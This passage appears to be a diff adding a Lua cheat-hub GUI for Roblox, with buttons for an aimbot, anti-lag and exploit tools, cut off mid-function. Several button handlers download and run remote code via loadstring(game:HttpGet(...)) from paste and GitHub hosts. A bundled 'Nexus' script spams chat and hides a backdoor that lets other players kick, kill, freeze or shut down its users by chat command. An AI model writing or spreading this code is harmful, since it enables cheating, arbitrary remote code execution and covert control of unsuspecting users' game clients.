+ScreepstuHub.ScreepstuHub_2.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ScreepstuHub_2.ZIndex = 2
+ScreepstuHub.ScreepstuHub_2.Font = Enum.Font.Arial
+ScreepstuHub.ScreepstuHub_2.Text = "Screepstu Hub"
+ScreepstuHub.ScreepstuHub_2.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ScreepstuHub_2.TextScaled = true
+ScreepstuHub.ScreepstuHub_2.TextSize = 14.000
+ScreepstuHub.ScreepstuHub_2.TextWrapped = true
+
+ScreepstuHub.UIStroke_49.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_49.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_49.Parent = ScreepstuHub.ScreepstuHub_2
+
+ScreepstuHub.UITextSizeConstraint_56.Parent = ScreepstuHub.ScreepstuHub_2
+ScreepstuHub.UITextSizeConstraint_56.MaxTextSize = 14
+
+ScreepstuHub.ReaperHub.Name = "ReaperHub"
+ScreepstuHub.ReaperHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.ReaperHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ReaperHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ReaperHub.BorderSizePixel = 0
+ScreepstuHub.ReaperHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ReaperHub.ZIndex = 2
+ScreepstuHub.ReaperHub.Font = Enum.Font.Arial
+ScreepstuHub.ReaperHub.Text = "Reaper Hub"
+ScreepstuHub.ReaperHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ReaperHub.TextScaled = true
+ScreepstuHub.ReaperHub.TextSize = 14.000
+ScreepstuHub.ReaperHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_50.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_50.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_50.Parent = ScreepstuHub.ReaperHub
+
+ScreepstuHub.UITextSizeConstraint_57.Parent = ScreepstuHub.ReaperHub
+ScreepstuHub.UITextSizeConstraint_57.MaxTextSize = 14
+
+ScreepstuHub.RedzHub.Name = "RedzHub"
+ScreepstuHub.RedzHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.RedzHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.RedzHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.RedzHub.BorderSizePixel = 0
+ScreepstuHub.RedzHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.RedzHub.ZIndex = 2
+ScreepstuHub.RedzHub.Font = Enum.Font.Arial
+ScreepstuHub.RedzHub.Text = "Redz Hub"
+ScreepstuHub.RedzHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.RedzHub.TextScaled = true
+ScreepstuHub.RedzHub.TextSize = 14.000
+ScreepstuHub.RedzHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_51.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_51.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_51.Parent = ScreepstuHub.RedzHub
+
+ScreepstuHub.UITextSizeConstraint_58.Parent = ScreepstuHub.RedzHub
+ScreepstuHub.UITextSizeConstraint_58.MaxTextSize = 14
+
+ScreepstuHub.ZapHub.Name = "ZapHub"
+ScreepstuHub.ZapHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.ZapHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ZapHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ZapHub.BorderSizePixel = 0
+ScreepstuHub.ZapHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ZapHub.ZIndex = 2
+ScreepstuHub.ZapHub.Font = Enum.Font.Arial
+ScreepstuHub.ZapHub.Text = "Zap Hub"
+ScreepstuHub.ZapHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ZapHub.TextScaled = true
+ScreepstuHub.ZapHub.TextSize = 14.000
+ScreepstuHub.ZapHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_52.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_52.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_52.Parent = ScreepstuHub.ZapHub
+
+ScreepstuHub.UITextSizeConstraint_59.Parent = ScreepstuHub.ZapHub
+ScreepstuHub.UITextSizeConstraint_59.MaxTextSize = 14
+
+ScreepstuHub.SpaceHub.Name = "SpaceHub"
+ScreepstuHub.SpaceHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.SpaceHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.SpaceHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.SpaceHub.BorderSizePixel = 0
+ScreepstuHub.SpaceHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.SpaceHub.ZIndex = 2
+ScreepstuHub.SpaceHub.Font = Enum.Font.Arial
+ScreepstuHub.SpaceHub.Text = "Space Hub"
+ScreepstuHub.SpaceHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.SpaceHub.TextScaled = true
+ScreepstuHub.SpaceHub.TextSize = 14.000
+ScreepstuHub.SpaceHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_53.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_53.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_53.Parent = ScreepstuHub.SpaceHub
+
+ScreepstuHub.UITextSizeConstraint_60.Parent = ScreepstuHub.SpaceHub
+ScreepstuHub.UITextSizeConstraint_60.MaxTextSize = 14
+
+ScreepstuHub.SolarisHub.Name = "SolarisHub"
+ScreepstuHub.SolarisHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.SolarisHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.SolarisHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.SolarisHub.BorderSizePixel = 0
+ScreepstuHub.SolarisHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.SolarisHub.ZIndex = 2
+ScreepstuHub.SolarisHub.Font = Enum.Font.Arial
+ScreepstuHub.SolarisHub.Text = "Solaris Hub"
+ScreepstuHub.SolarisHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.SolarisHub.TextScaled = true
+ScreepstuHub.SolarisHub.TextSize = 14.000
+ScreepstuHub.SolarisHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_54.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_54.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_54.Parent = ScreepstuHub.SolarisHub
+
+ScreepstuHub.UITextSizeConstraint_61.Parent = ScreepstuHub.SolarisHub
+ScreepstuHub.UITextSizeConstraint_61.MaxTextSize = 14
+
+ScreepstuHub.ShifeHub.Name = "ShifeHub"
+ScreepstuHub.ShifeHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.ShifeHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ShifeHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ShifeHub.BorderSizePixel = 0
+ScreepstuHub.ShifeHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ShifeHub.ZIndex = 2
+ScreepstuHub.ShifeHub.Font = Enum.Font.Arial
+ScreepstuHub.ShifeHub.Text = "Shife Hub"
+ScreepstuHub.ShifeHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ShifeHub.TextScaled = true
+ScreepstuHub.ShifeHub.TextSize = 14.000
+ScreepstuHub.ShifeHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_55.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_55.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_55.Parent = ScreepstuHub.ShifeHub
+
+ScreepstuHub.UITextSizeConstraint_62.Parent = ScreepstuHub.ShifeHub
+ScreepstuHub.UITextSizeConstraint_62.MaxTextSize = 14
+
+ScreepstuHub.ScreepstuHub.Parent = game.CoreGui
+
+-- Semua skrip:
+
+local function DXMR_fake_script() -- ScreepstuHub.LabelAndTitle.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.LabelAndTitle)
+
+	script.Parent.Text = game.Name .. " - Screepstu Hub"
+end
+coroutine.wrap(DXMR_fake_script)()
+local function TAIVLO_fake_script() -- ScreepstuHub.Close.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Close)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = false
+
+		wait(.5)
+
+		script.Parent.Parent.Parent.Verti_Line:TweenPosition(
+			UDim2.new(5, 100, 0 ,30),
+			Enum.EasingDirection.InOut,
+			Enum.EasingStyle.Quint,
+			2
+		)
+
+		script.Parent.Parent.Parent.Tab:TweenPosition(
+			UDim2.new(5, 0, 0 ,30),
+			Enum.EasingDirection.InOut,
+			Enum.EasingStyle.Quint,
+			2
+		)
+
+		script.Parent.Parent.Parent.Horiz_Line:TweenPosition(
+			UDim2.new(5, 0, 0 ,29),
+			Enum.EasingDirection.InOut,
+			Enum.EasingStyle.Quint,
+			2
+		)
+
+		script.Parent.Parent.Parent.MainTop:TweenPosition(
+			UDim2.new(5, 0, 0 ,0),
+			Enum.EasingDirection.InOut,
+			Enum.EasingStyle.Quint,
+			2
+		)
+
+		task.wait(2)
+
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(TAIVLO_fake_script)()
+local function RMGL_fake_script() -- ScreepstuHub.Minimise.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Minimise)
+
+	local sg = script.Parent.Parent.Parent
+
+	script.Parent.MouseButton1Click:Connect(function()
+		sg.Container1.Visible = false
+		sg.Container2.Visible = false
+		sg.Container3.Visible = false
+		sg.Container4.Visible = false
+		sg.MainTop.Visible = false
+		sg.Tab.Visible = false
+		sg.Horiz_Line.Visible = false
+		sg.Verti_Line.Visible = false
+		sg.RestoreUp.Visible = true
+	end)
+end
+coroutine.wrap(RMGL_fake_script)()
+local function KZTV_fake_script() -- ScreepstuHub.Exit.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Exit)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game:shutdown()
+	end)
+end
+coroutine.wrap(KZTV_fake_script)()
+local function GGNGUTF_fake_script() -- ScreepstuHub.VisibleContainer.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.VisibleContainer)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = false
+	end)
+end
+coroutine.wrap(GGNGUTF_fake_script)()
+local function LMMEKZE_fake_script() -- ScreepstuHub.T1.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.T1)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = true
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = false
+	end)
+end
+coroutine.wrap(LMMEKZE_fake_script)()
+local function ZDKNYQD_fake_script() -- ScreepstuHub.T2.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.T2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = true
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = false
+	end)
+end
+coroutine.wrap(ZDKNYQD_fake_script)()
+local function BEVV_fake_script() -- ScreepstuHub.T3.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.T3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = true
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = false
+	end)
+end
+coroutine.wrap(BEVV_fake_script)()
+local function UMIPMS_fake_script() -- ScreepstuHub.T4.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.T4)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = true
+		script.Parent.Parent.Parent.Container5.Visible = false
+	end)
+end
+coroutine.wrap(UMIPMS_fake_script)()
+local function KSVN_fake_script() -- ScreepstuHub.T5.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.T5)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Container1.Visible = false
+		script.Parent.Parent.Parent.Container2.Visible = false
+		script.Parent.Parent.Parent.Container3.Visible = false
+		script.Parent.Parent.Parent.Container4.Visible = false
+		script.Parent.Parent.Parent.Container5.Visible = true
+	end)
+end
+coroutine.wrap(KSVN_fake_script)()
+local function XAYFEJ_fake_script() -- ScreepstuHub.RestoreUp.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.RestoreUp)
+
+	local sg = script.Parent.Parent
+
+	function dragify(Frame)
+		dragToggle = nil
+		dragSpeed = .25
+		dragInput = nil
+		dragStart = nil
+		dragPos = nil
+
+		function updateInput(input)
+			Delta = input.Position - dragStart
+			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+			game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
+		end
+
+		Frame.InputBegan:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+				input.Changed:Connect(function()
+					if (input.UserInputState == Enum.UserInputState.End) then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+
+		Frame.InputChanged:Connect(function(input)
+			if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				dragInput = input
+			end
+		end)
+
+		game:GetService("UserInputService").InputChanged:Connect(function(input)
+			if (input == dragInput and dragToggle) then
+				updateInput(input)
+			end
+		end)
+	end
+
+	dragify(script.Parent)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		sg.Container1.Visible = true
+		sg.Container2.Visible = false
+		sg.Container3.Visible = false
+		sg.Container4.Visible = false
+		sg.MainTop.Visible = true
+		sg.Tab.Visible = true
+		sg.Horiz_Line.Visible = true
+		sg.Verti_Line.Visible = true
+		sg.RestoreUp.Visible = false
+	end)
+end
+coroutine.wrap(XAYFEJ_fake_script)()
+local function GHJJT_fake_script() -- ScreepstuHub.AimbotV3.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.AimbotV3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://rentry.co/aimbotv3/raw"))()
+	end)
+end
+coroutine.wrap(GHJJT_fake_script)()
+local function BMCTJKE_fake_script() -- ScreepstuHub.AntiLag.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.AntiLag)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local Terrain = workspace:FindFirstChildOfClass('Terrain')
+		local Lighting = game.Lighting
+		local RunService = game:GetService("RunService")
+
+		Terrain.WaterWaveSize = 0
+		Terrain.WaterWaveSpeed = 0
+		Terrain.WaterReflectance = 0
+		Terrain.WaterTransparency = 0
+		Lighting.GlobalShadows = false
+		Lighting.FogEnd = 9e9
+		settings().Rendering.QualityLevel = 1
+
+		for i,v in pairs(game:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+			elseif v:IsA("Decal") then
+				v.Transparency = 1
+			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+				v.Lifetime = NumberRange.new(0)
+			elseif v:IsA("Explosion") then
+				v.BlastPressure = 1
+				v.BlastRadius = 1
+			end
+		end
+
+		for i,v in pairs(Lighting:GetDescendants()) do
+			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
+				v.Enabled = false
+			end
+		end
+
+		workspace.DescendantAdded:Connect(function(child)
+			task.spawn(function()
+				if child:IsA('ForceField') then
+					RunService.Heartbeat:Wait()
+					child:Destroy()
+				elseif child:IsA('Sparkles') then
+					RunService.Heartbeat:Wait()
+					child:Destroy()
+				elseif child:IsA('Smoke') or child:IsA('Fire') then
+					RunService.Heartbeat:Wait()
+					child:Destroy()
+				end
+			end)
+		end)
+	end)
+end
+coroutine.wrap(BMCTJKE_fake_script)()
+local function WLWT_fake_script() -- ScreepstuHub.BetterRoblox.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.BetterRoblox)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		getgenv().DisableWebhook = false
+		loadstring(game:HttpGet("https://eternityhub.xyz/BetterRoblox/Loader"))()
+	end)
+end
+coroutine.wrap(WLWT_fake_script)()
+local function VSIJBI_fake_script() -- ScreepstuHub.CMDX.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.CMDX)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+	end)
+end
+coroutine.wrap(VSIJBI_fake_script)()
+local function ENSF_fake_script() -- ScreepstuHub.DExplorer.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.DExplorer)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Creepstu/DExplorer/main/source"))()	
+	end)
+end
+coroutine.wrap(ENSF_fake_script)()
+local function JBZZVZ_fake_script() -- ScreepstuHub.DomainX.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.DomainX)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
+	end)
+end
+coroutine.wrap(JBZZVZ_fake_script)()
+local function XRYLX_fake_script() -- ScreepstuHub.Hydroxide.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.Hydroxide)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local owner = "Upbolt"
+		local branch = "revision"
+
+		local function webImport(file)
+			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
+		end
+
+		webImport("init")
+		webImport("ui/main")
+	end)
+end
+coroutine.wrap(XRYLX_fake_script)()
+local function YYPW_fake_script() -- ScreepstuHub.InfiniteYield.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.InfiniteYield)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/vDrevn/IY/main/source"))()
+	end)
+end
+coroutine.wrap(YYPW_fake_script)()
+local function VFMP_fake_script() -- ScreepstuHub.NexusWeaponry.LocalScript 
+	local script = Instance.new('LocalScript', ScreepstuHub.NexusWeaponry)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		if getgenv().nexus then 
+			return
+		end 
+
+		local HttpService = game:GetService("HttpService")
+		local fileName = "FLORENCE/SETTINGS/" .. game.PlaceId .. '.txt'
+		getgenv().settings = {}
+		getgenv().nexus = true
+
+		if isfile("FLORENCE/SETTINGS/" .. game.PlaceId .. '.txt') then
+			local sl, er = pcall(function()
+				getgenv().settings = game:GetService('HttpService'):JSONDecode(readfile("FLORENCE/SETTINGS/" .. game.PlaceId .. '.txt'))
+			end)
+
+			if er ~= nil then
+				forceServerHop()
+				return
+			end
+		end 
+
+		writefile("FLORENCE/SETTINGS/" .. game.PlaceId .. '.txt', HttpService:JSONEncode(getgenv().settings))
+
+		function forceServerHop()
+			local Api = "https://games.roblox.com/v1/games/"
+			local placeId, jobId = game.PlaceId, game.JobId
+			local serversUrl = Api .. placeId .. "/servers/Public?sortOrder=Desc&limit=100"
+
+			local function ListServers(cursor)
+				local raw = game:HttpGet(serversUrl .. (cursor and "&cursor=" .. cursor or ""))
+				return HttpService:JSONDecode(raw)
+			end
+
+			local nextCursor
+
+			repeat
+				local serversData = ListServers(nextCursor)
+				for _, server in ipairs(serversData.data) do
+					if server.playing < server.maxPlayers and server.id ~= jobId then
+						local success, result = pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, server.id, LocalPlayer)
+						if success then
+							break
+						end
+					end
+				end
+
+				nextCursor = serversData.nextPageCursor
+			until not nextCursor
+		end
+
+		local myEvent = Instance.new("BindableEvent")
+		local connection = myEvent.Event:Connect(function()
+		end)
+
+		local function createLoop(callback)
+			return spawn(function()
+				while task.wait() do
+					if connection.Connected == true then
+						local success, result = pcall(function() 
+							callback()
+						end)
+					end
+				end
+			end)
+		end
+
+		createLoop(function()
+			for key, value in pairs(getgenv().settings) do
+				if connection.Connected == true and getgenv().settings.AutoSave == true then 
+					getgenv().settings[key] = value
+					writefile(fileName, HttpService:JSONEncode(getgenv().settings))
+				end
+			end
+		end)
+
+		local Fluent = loadstring(game:HttpGet("https://github.com/13B8B/nexus/releases/download/nexus/nexus.txt"))()
+	--[[
+	   premium = true
+	]]
+
+		local Window = Fluent:CreateWindow({
+			Title = "nexus - universal ", "",
+			SubTitle = "",
+			TabWidth = 160,
+			Size = UDim2.fromOffset(580, 460),
+			Acrylic = true,
+			Theme = "Dark",
+		})
+
+		local Tabs = {
+			Main = Window:AddTab({
+				Title = "Main",
+				Icon = "rbxassetid://10723424505"
+			}),
+			Settings = Window:AddTab({
+				Title = "Settings",
+				Icon = "settings"
+			}),
+			Premium = premium == "premium" and Window:AddTab({
+				Title = "Premium",
+				Icon = "rbxassetid://10709819149"
+			}),
+
+		}
+
+		Tabs.Main:AddParagraph({
+			Title = "Nexus Universal",
+			Content = "Welcome to Nexus Universal!\n\nWe're excited to introduce the upcoming Universal script to enhance your experience. Currently in development, this script is designed to bring you a host of new features and improvements.\n\nOur dedicated team is working diligently to make this script a reality. While it's not ready just yet, we're making great progress.\n\nStay tuned for updates, and thank you for your patience and support! https://discord.gg/KHKu84ZyhD"
+		})
+
+		local KeyBindName = getgenv().settings.KeyBind or ""
+
+		local Keybind = Tabs.Settings:AddKeybind("Keybind", {
+			Title = "KeyBind",
+			Mode = "Toggle",
+			Default = KeyBindName,
+			ChangedCallback = function(New)
+				KeyBindName = New.Name
+				getgenv().settings.KeyBind = New.Name  
+			end
+		})
+
+		game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
+			local settingsKeyBind = getgenv().settings.KeyBind
+
+			if input.KeyCode == Enum.KeyCode.Home or settingsKeyBind == input.KeyCode.Name then
+				if game:GetService("CoreGui").ScreenGui.Frame.Visible then
+					Fluent:Notify({Title = 'Window Minimized', Content = 'Press ' .. settingsKeyBind .. ' to Open the UI', Duration = 5 })
+				end
+				Window:Minimize() 
+			end
+		end)
+
+		local Toggle = Tabs.Settings:AddToggle("Toggle", {
+			Title = "Auto Save Settings",
+			Default = getgenv().settings.AutoSave,
+			Callback = function(value)
+				getgenv().settings.AutoSave = value
+				writefile(fileName, HttpService:JSONEncode(getgenv().settings))
+			end
+		})
+
+		local Toggle = Tabs.Settings:AddToggle("Toggle", {
+			Title = "Auto ReExecute",
+			Default = getgenv().settings.AutoExecute,
+			Callback = function(value)
+				getgenv().settings.AutoExecute = value
+				if getgenv().settings.AutoExecute then
+					local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+					if queueteleport then
+						queueteleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/13B8B/nexus/main/loadstring"))()')
+					end
+				end
+			end
+		})
+
+		local Toggle = Tabs.Settings:AddToggle("Toggle", {
+			Title = "Auto Rejoin",
+			Default = getgenv().settings.AutoRejoin,
+			Callback = function(value)
+				getgenv().settings.AutoRejoin = value
+				if getgenv().settings.AutoRejoin then
+					Fluent:Notify({Title = 'Auto Rejoin', Content = 'You will rejoin if you are kicked or disconnected from the game', Duration = 5 })
+					repeat task.wait() until game.CoreGui:FindFirstChild('RobloxPromptGui')
+					local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService')
+					po.ChildAdded:connect(function(a)
+						if a.Name == 'ErrorPrompt' then
+							while true do
+								ts:Teleport(game.PlaceId)
+								task.wait(2)
+							end
+						end
+					end)
+				end
+			end
+		})
+
+		Tabs.Settings:AddButton({
+			Title = "Rejoin-Server",
+			Callback = function()
+				game:GetService("TeleportService"):Teleport(game.PlaceId, Player)
+			end
+		})
+
+		Tabs.Settings:AddButton({
+			Title = "Server-Hop", 
+			Callback = function()
+				local Http = game:GetService("HttpService")
+				local TPS = game:GetService("TeleportService")
+				local Api = "https://games.roblox.com/v1/games/"
+				local _place,_id = game.PlaceId, game.JobId
+				local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
+				local function ListServers(cursor)
+					local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
+					return Http:JSONDecode(Raw)
+				end
+				local Next; repeat
+					local Servers = ListServers(Next)
+					for i,v in next, Servers.data do
+						if v.playing < v.maxPlayers and v.id ~= _id then
+							local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
+							if s then break end
+						end
+					end
+					Next = Servers.nextPageCursor
+				until not Next
+			end
+		})
+
+		createLoop(function()
+			if premium == "premium" then
+				game.Players:Chat("nexus-premium")
+			else task.wait(math.random(0.1, 1)) 
+				game.Players:Chat("nexus-is-back")
+			end
+		end)
+
+		----------// PREMIUM \\----------
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Kick",
+			Callback = function()
+				game.Players:Chat(".k " .. getgenv().Selected)
+			end 
+		})
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Kill",
+			Callback = function()
+				game.Players:Chat(".r " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Teleport",
+			Callback = function()
+				game.Players:Chat(".b " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Shut Game Down",
+			Callback = function()
+				game.Players:Chat(".s " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Freeze",
+			Callback = function()
+				game.Players:Chat(".f " .. getgenv().Selected)
+			end
+		})
+		Tab = premium == "premium" and Tabs.Premium:AddButton({
+			Title = "Unfreeze",
+			Callback = function()
+				game.Players:Chat(".u " .. getgenv().Selected)
+			end
+		})
+
+		task.spawn(function()
+			while task.wait() do 
+				local playersService = game:GetService("Players")
+				local textChatService = game:GetService("TextChatService")
+				local lplr = playersService.LocalPlayer
+				local localPlayerNameWithoutUnderscores = lplr.Name:gsub("_", "")
+
+				for _, player in ipairs(playersService:GetPlayers()) do
+					player.Chatted:Connect(function(msg)
+						local success, errorMessage = pcall(function()
+							local processedMsg = msg:gsub("_", "")
+							if processedMsg == ".k " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer:kick("nexus-premium user has kicked you")
+							elseif processedMsg == ".r " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.Humanoid.Health = 0
+							elseif processedMsg == ".b " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = workspace[player.Name].HumanoidRootPart.CFrame
+							elseif processedMsg == ".s " .. localPlayerNameWithoutUnderscores then
+								game:Shutdown()
+							elseif processedMsg == ".f " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+							elseif processedMsg == ".u " .. localPlayerNameWithoutUnderscores then
+								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false    
+							end  
+						end)
+					end) 
+				end
+				wait(1)  
+			end 
+		end)
+		local nexus = {}
+		local updatedPlayers = {} 
+		local Dropdown
+
+		local function UpdateDropdownValues()
+			if Dropdown then
+				Dropdown:SetValues(nexus)
+			end
+		end
+		local function RemovePlayer(player)
+			for i, playerName in ipairs(nexus) do
+				if playerName == player.Name then
+					table.remove(nexus, i)
+					updatedPlayers[player] = nil
+					UpdateDropdownValues()
+					break
+				end
+			end
+		end
